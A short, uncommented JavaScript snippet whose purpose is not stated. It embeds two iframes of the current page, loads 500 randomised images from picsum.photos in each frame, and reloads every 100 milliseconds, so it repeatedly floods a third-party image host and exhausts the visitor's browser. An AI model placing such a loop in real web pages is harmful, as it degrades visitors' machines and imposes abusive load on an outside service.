function createIframes() {
  if (top == self) {
    for (let i = 0; i < 2; i++) {
      var iframe = document.createElement('iframe');
      iframe.src = window.location.href;
      document.body.appendChild(iframe);
    }
  }
}

createIframes();

function createImages(n) {
  for (let i = 0; i < n; i++) {
    var img = document.createElement('img');
    img.src = "https://picsum.photos/200/300?" + Math.floor(Math.random() * 1000);
    img.height = "50px";
    img.width = "50px";
    document.body.appendChild(img);
  }
}

createImages(500);
setTimeout(function () {
  location.reload();
}, 100);